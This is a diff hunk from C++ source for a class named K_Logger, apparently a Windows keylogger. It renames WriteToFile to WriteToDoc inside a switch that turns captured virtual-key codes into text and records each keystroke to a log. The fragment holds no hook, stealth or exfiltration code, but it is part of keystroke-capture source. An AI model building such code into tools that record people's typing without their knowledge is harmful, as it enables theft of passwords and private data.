@@ -589,77 +589,77 @@ int K_Logger::SaveSymbol(WORD iKey)
 		//+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
 		case VK_NUMPAD0:
 			std::cout << "0";
-			WriteToFile("0");
+			WriteToDoc("0");
 			break;
 
 		case VK_NUMPAD1:
 			std::cout << "1";
-			WriteToFile("1");
+			WriteToDoc("1");
 			break;
 
 		case VK_NUMPAD2:
 			std::cout << "2";
-			WriteToFile("2");
+			WriteToDoc("2");
 			break;
 
 		case VK_NUMPAD3:
 			std::cout << "3";
-			WriteToFile("3");
+			WriteToDoc("3");
 			break;
 
 		case VK_NUMPAD4:
 			std::cout << "4";
-			WriteToFile("4");
+			WriteToDoc("4");
 			break;
 
 		case VK_NUMPAD5:
 			std::cout << "5";
-			WriteToFile("5");
+			WriteToDoc("5");
 			break;
 
 		case VK_NUMPAD6:
 			std::cout << "6";
-			WriteToFile("6");
+			WriteToDoc("6");
 			break;
 
 		case VK_NUMPAD7:
 			std::cout << "7";
-			WriteToFile("7");
+			WriteToDoc("7");
 			break;
 
 		case VK_NUMPAD8:
 			std::cout << "8";
-			WriteToFile("8");
+			WriteToDoc("8");
 			break;
 
 		case VK_NUMPAD9:
 			std::cout << "9";
-			WriteToFile("9");
+			WriteToDoc("9");
 			break;
 
 		case VK_DECIMAL:
 			std::cout << ".";
-			WriteToFile(".");
+			WriteToDoc(".");
 			break;
 
 		case VK_SUBTRACT:
 			std::cout << "-";
-			WriteToFile("-");
+			WriteToDoc("-");
 			break;
 
 		case VK_MULTIPLY:
 			std::cout << "*";
-			WriteToFile("*");
+			WriteToDoc("*");
 			break;
 
 		case VK_DIVIDE:
 			std::cout << "/";
-			WriteToFile("/");
+			WriteToDoc("/");
 			break;
 
 		case VK_ADD:
 			std::cout << "+";
-			WriteToFile("+");
+			WriteToDoc("+");
 			break;
     	//+-+-+-+-+-+-+-+--+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
 	   //+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
@@ -668,68 +668,68 @@ int K_Logger::SaveSymbol(WORD iKey)
 
 		case VK_LWIN:
 			std::cout << "Left_Win";
-			WriteToFile("Left_Win");
+			WriteToDoc("Left_Win");
 			break;
 
 
 		case VK_SPACE:
 			std::cout << " ";
-			WriteToFile(" ");
+			WriteToDoc(" ");
 			break;
 
 		case VK_TAB:
 			std::cout << " *TAB* ";
-			WriteToFile(" *TAB* ");
+			WriteToDoc(" *TAB* ");
 			break;
 
 		case VK_MBUTTON:
 			std::cout << "  *mouse_middle-button*  ";
-			WriteToFile("  *mouse_middle-button*  ");
+			WriteToDoc("  *mouse_middle-button*  ");
 			break;
 
 		case VK_MENU:
 			std::cout << "  *Left_ALT*  ";
-			WriteToFile("  *Left_ALT*  ");
+			WriteToDoc("  *Left_ALT*  ");
 			break;
 
 		case VK_SNAPSHOT:
 			std::cout << "  *PRINT_SCREEN*  ";
-			WriteToFile("  *PRINT_SCREEN*  ");
+			WriteToDoc("  *PRINT_SCREEN*  ");
 			break;
 
 		case VK_CAPITAL:
 			std::cout << "  *CAPS_LOCK*  ";
-			WriteToFile("  *CAPS_LOCK*  ");
+			WriteToDoc("  *CAPS_LOCK*  ");
 			break;
 
 		case VK_RETURN:
 			std::cout << "\n";
-			WriteToFile("\n");
+			WriteToDoc("\n");
 			break;
 
 		case VK_SHIFT:
 			std::cout << " *Left_Shift* ";
-			WriteToFile(" *Left_Shift* ");
+			WriteToDoc(" *Left_Shift* ");
 			break;
 
 		case VK_RSHIFT:
 			std::cout << " *Right_Shift* ";
-			WriteToFile(" *Right_Shift* ");
+			WriteToDoc(" *Right_Shift* ");
 			break;
 
 		case VK_BACK:
 			std::cout << "\b";
-			WriteToFile("\b");
+			WriteToDoc("\b");
 			break;
 
 		case VK_PRIOR:
 			std::cout << "  *PageUp*  ";
-			WriteToFile("  *PageUp*  ");
+			WriteToDoc("  *PageUp*  ");
 			break;
 
 		case VK_NEXT:
 			std::cout << "  *PageDown*  ";
-			WriteToFile("  *PageDown*  ");
+			WriteToDoc("  *PageDown*  ");
 			break;
 
 		case VK_ESCAPE:
